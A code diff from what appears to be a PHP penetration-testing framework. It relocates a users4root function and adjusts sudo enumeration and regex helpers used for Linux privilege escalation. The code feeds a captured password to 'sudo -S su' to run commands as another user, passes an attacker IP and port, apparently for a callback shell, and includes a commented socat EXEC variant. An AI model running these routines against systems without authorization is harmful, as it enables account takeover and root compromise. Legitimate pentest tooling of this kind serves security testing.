@@ -764,27 +764,6 @@ Can be used to determine where other interesting files might be located");
     
     
     
-    
-    
-    
-    public function users4root($user_name,$user_pass){
-        $this->ssTitre(__FUNCTION__);
-        $user_name = trim($user_name);
-        $user_pass = trim($user_pass);
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        //$attacker_port = 7777;
-        $shell = "/bin/bash";
-        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
-        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' ";
-        
-        
-        return $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
-        
-    }
-    
-    
-    
     public function users(){
         $this->titre(__FUNCTION__);
         $users_passwd = $this->ip2users4passwd();
@@ -813,7 +792,7 @@ Can be used to determine where other interesting files might be located");
     public function users2sudoers2list($user_name,$user_pass){
         $this->titre("Linux Privilege Escalation using Sudo Rights");
         $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");
-        $data = "echo '$user_pass' | sudo -S su --login '$user_name' --list ";
+        $data = "echo '$user_pass' | sudo -l -S -U '$user_name' "; // su --login '$user_name'
         return $this->lan2stream4result($data,$this->stream_timeout*3);
     }
     
@@ -825,7 +804,7 @@ Can be used to determine where other interesting files might be located");
     public function users2sudoers8filepath($sudoers_str){
         $result = "";
         $this->ssTitre(__FUNCTION__);
-        $data = "echo '$sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_]{1,})+)\"  ";
+        $data = "echo '$sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\"  ";
         $list_apps = exec($data);
         $result .= $list_apps;
         $tab_apps = explode(",", $list_apps);
@@ -851,6 +830,25 @@ Can be used to determine where other interesting files might be located");
     
     
     
+    
+    public function users4root($user_name,$user_pass){
+        $this->ssTitre(__FUNCTION__);
+        $user_name = trim($user_name);
+        $user_pass = trim($user_pass);
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        //$attacker_port = 7777;
+        $shell = "/bin/bash";
+        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
+        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' ";
+        
+        
+        return $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        
+    }
+    
+    
+     
     
     
     
